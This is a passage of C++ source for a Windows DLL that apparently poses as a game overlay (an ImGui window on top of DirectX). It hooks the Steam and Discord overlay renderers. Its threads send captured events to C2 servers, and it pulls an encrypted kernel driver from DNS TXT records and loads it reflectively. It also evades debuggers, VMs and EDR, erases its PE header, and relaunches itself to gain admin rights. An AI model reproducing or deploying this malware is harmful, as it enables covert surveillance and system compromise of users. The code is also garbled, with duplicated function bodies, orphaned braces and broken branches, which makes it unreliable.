    }
    return 0;
}
    return 0;
}

DWORD WINAPI RealtimeExfilThread(LPVOID) {
    while (true) {
        std::lock_guard<std::mutex> lock(g_eventMutex);
        while (!g_eventQueue.empty()) {
            auto [ip, port] = c2Endpoints[currentC2Index];
            ExfiltrateToC2(ip, port, g_eventQueue.front());
            g_eventQueue.pop();
            Sleep(100);
        }
        Sleep(2500);
    }
    return 0;
}
        Sleep(2500);
    }
    return 0;
}

HRESULT APIENTRY HookedPresent(IDXGISwapChain* pSwapChain, UINT SyncInterval, UINT Flags) {
    if (!g_Backend || g_Backend == GfxBackend::None) {
        DXGI_SWAP_CHAIN_DESC sd = {};
        if (SUCCEEDED(pSwapChain->GetDesc(&sd))) {
            g_Backend = GfxBackend::DX11;
        }
    }
    g_Backend = GfxBackend::DX11;
    if (!g_pTargetSwapChain) g_pTargetSwapChain = pSwapChain;
    if (!overlayInitialized) {
        DXGI_SWAP_CHAIN_DESC sd; pSwapChain->GetDesc(&sd);
        if (g_Backend == GfxBackend::DX12) InitDX12Hook(pSwapChain);
        pSwapChain->GetDevice(__uuidof(ID3D11Device), (void**)&g_pDevice11);
        g_pDevice11->GetImmediateContext(&g_pContext11);
        ID3D11Texture2D* pBackBuffer;
        pSwapChain->GetBuffer(0, IID_PPV_ARGS(&pBackBuffer));
        g_pDevice11->CreateRenderTargetView(pBackBuffer, nullptr, &g_pRT11);
        pBackBuffer->Release();
        ImGui::CreateContext();
        ImGui_ImplWin32_Init(sd.OutputWindow);
        ImGui_ImplDX11_Init(g_pDevice11, g_pContext11);
        overlayInitialized = true;
    }
    SHORT keyState = GetAsyncKeyState(VK_HOME);
    if (keyState & 0x8000) {
        if (!wasPressed) { showImGuiOverlay = !showImGuiOverlay; wasPressed = true; }
    } else { wasPressed = false; }
    ImGui_ImplWin32_NewFrame(); // applies to DX11/Win32 combo
    if (g_Backend == GfxBackend::DX9) ImGui_ImplDX9_NewFrame();
    else if (g_Backend == GfxBackend::DX12) ImGui_ImplDX12_NewFrame();
    if (g_Backend == GfxBackend::DX11) ImGui_ImplDX11_NewFrame();
    ImGui::NewFrame();
    if (showImGuiOverlay) {
        ImGui::Begin("Ghost Overlay");
        ImGui::Text("Overlay + C2 Active");
        ImGui::End();
    }
    ImGui::Render();
    g_pContext11->OMSetRenderTargets(1, &g_pRT11, nullptr);
    if (g_Backend == GfxBackend::DX11) if (g_Backend == GfxBackend::DX11 && g_pContext11 && g_pRT11) {
        g_pContext11->OMSetRenderTargets(1, &g_pRT11, nullptr);
        ImGui_ImplDX11_RenderDrawData(ImGui::GetDrawData());
    } else if (g_Backend == GfxBackend::DX9 && g_pDeviceDX9) {
        ImGui_ImplDX9_RenderDrawData(ImGui::GetDrawData());
    } else if (g_Backend == GfxBackend::DX12 && g_pCmdListDX12) {
        ImGui_ImplDX12_RenderDrawData(ImGui::GetDrawData(), g_pCmdListDX12);
    }
    else if (g_Backend == GfxBackend::DX9 && g_pDeviceDX9) ImGui_ImplDX9_RenderDrawData(ImGui::GetDrawData());
    else if (g_Backend == GfxBackend::DX12) ImGui_ImplDX12_RenderDrawData(ImGui::GetDrawData(), g_pCmdListDX12);
    return oPresent11 ? oPresent11(pSwapChain, SyncInterval, Flags) : pSwapChain->Present(SyncInterval, Flags);
}
    SHORT keyState = GetAsyncKeyState(VK_HOME);
    if (keyState & 0x8000) {
        if (!wasPressed) { showImGuiOverlay = !showImGuiOverlay; wasPressed = true; }
    } else { wasPressed = false; }
    ImGui_ImplDX11_NewFrame();
    ImGui_ImplWin32_NewFrame();
    ImGui::NewFrame();
    if (showImGuiOverlay) {
        ImGui::Begin("Ghost Overlay");
        ImGui::Text("Overlay + C2 Active");
        ImGui::End();
    }
    ImGui::Render();
    g_pContext11->OMSetRenderTargets(1, &g_pRT11, nullptr);
    ImGui_ImplDX11_RenderDrawData(ImGui::GetDrawData());
    return pSwapChain->Present(SyncInterval, Flags);
}

DWORD WINAPI MainThread(LPVOID) {
    // Try DX9 init
    HWND targetWnd = FindWindow(NULL, NULL);
    if (targetWnd && InitDX9Hook(targetWnd)) {
        g_Backend = GfxBackend::DX9;
        return 0;
    }
    HMODULE hSteam = GetModuleHandleA("GameOverlayRenderer64.dll");
    if (hSteam) {
        uintptr_t present = FindPattern("GameOverlayRenderer64.dll", "48 89 5C 24 ? 48 89 6C 24 ? 48 89 74 24 ? 57 41 56 41 57 48 83 EC ? 41 8B E8");
        uintptr_t createHook = FindPattern("GameOverlayRenderer64.dll", "48 89 5C 24 ? 57 48 83 EC ? 33 C0 48 89 44 24");
        if (present && createHook) {
            auto CreateHook = (CreateHook_t)createHook;
            CreateHook(present, (__int64)&HookedPresent, (unsigned __int64*)&oPresent11, 1);
        }
    } else {
        HMODULE hDiscord = GetModuleHandleA("DiscordHook64.dll");
        if (hDiscord) {
            uint64_t addr = (uint64_t)hDiscord + 0x1070E0;
            Present11* discord_present = (Present11*)addr;
            if (discord_present && *discord_present) {
                oPresent11 = *discord_present;
                _InterlockedExchangePointer((volatile PVOID*)addr, (PVOID)HookedPresent);
            }
        }
    }
    CreateThread(nullptr, 0, PeriodicExfilThread, nullptr, 0, nullptr);
    CreateThread(nullptr, 0, RealtimeExfilThread, nullptr, 0, nullptr);

    // Load driver blob from DNS and send IOCTLs
    std::string encoded = FetchTXTRecord("driverblob");
    if (!encoded.empty()) {
        XorEncrypt(encoded);
        std::string binary;
        for (size_t i = 0; i + 1 < encoded.size(); i += 2) {
            std::string byteStr = encoded.substr(i, 2);
            binary.push_back((char)strtoul(byteStr.c_str(), nullptr, 16));
        }
        std::vector<BYTE> driverData(binary.begin(), binary.end());
        if (LoadDriverReflectively(driverData)) {
            HANDLE hDriver = CreateFileA("\\.\MyDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
            if (hDriver != INVALID_HANDLE_VALUE) {
                std::vector<DWORD> ioctls = LoadIOCTLsFromDNS();
                SendIOCTLsToDriver(hDriver, ioctls);
                CloseHandle(hDriver);
            }
        }
    }
    return 0;
}
    }
    CreateThread(nullptr, 0, PeriodicExfilThread, nullptr, 0, nullptr);
    CreateThread(nullptr, 0, RealtimeExfilThread, nullptr, 0, nullptr);
    return 0;
}

void WipePEHeader() {
    HMODULE hMod = GetModuleHandle(nullptr);
    DWORD old;
    if (VirtualProtect(hMod, 4096, PAGE_EXECUTE_READWRITE, &old)) {
        CloakRegionFromEDR(hMod, 4096);
        ZeroMemory(hMod, 4096);
        VirtualProtect(hMod, 4096, old, &old);
    }
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    // DX9 Setup stub: assign g_Backend dynamically if needed
    if (fdwReason == DLL_PROCESS_ATTACH) {
        g_Backend = GfxBackend::None;
    }
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinstDLL);
        CreateThread(nullptr, 0, [](LPVOID) -> DWORD {
            if (IsDebuggerPresent() || IsDebuggerAdvanced() || IsVirtualMachine()) ExitProcess(0);
            Sleep(3000);
            if (IsDebuggerPresent()) ExitProcess(0);
            RotateAESKeyFromDNS();
            WipePEHeader();
            if (IsUserAdmin()) {
                Log("[+] Running as Admin");
            } else {
                Log("[-] Not running as Admin");

                SHELLEXECUTEINFO sei = { sizeof(sei) };
                char path[MAX_PATH];
                GetModuleFileNameA(NULL, path, MAX_PATH);
                sei.lpVerb = "runas";
                sei.lpFile = path;
                sei.hwnd = NULL;
                sei.nShow = SW_NORMAL;
                sei.fMask = SEE_MASK_FLAG_NO_UI;
                if (ShellExecuteEx(&sei)) {
                    Log("[*] Relaunching with elevation...");
                    ExitProcess(0);
                } else {
                    Log("[!] Elevation refused or failed");
                }
            }
            else Log("[-] Not running as Admin");
            if (IsUACEnabled()) Log("[*] UAC is enabled");
            else Log("[*] UAC is disabled");
            InMemoryPersistenceStub();
            MainThread(nullptr);
            return 0;
        }, nullptr, 0, nullptr);
    } else if (fdwReason == DLL_PROCESS_DETACH) {
        ImGui_ImplDX11_Shutdown();
        ImGui_ImplWin32_Shutdown();
        ImGui::DestroyContext();
        if (g_pRT11) { g_pRT11->Release(); g_pRT11 = nullptr; }
        g_pContext11 = nullptr;
        g_pDevice11 = nullptr;
    }
    return TRUE;
}
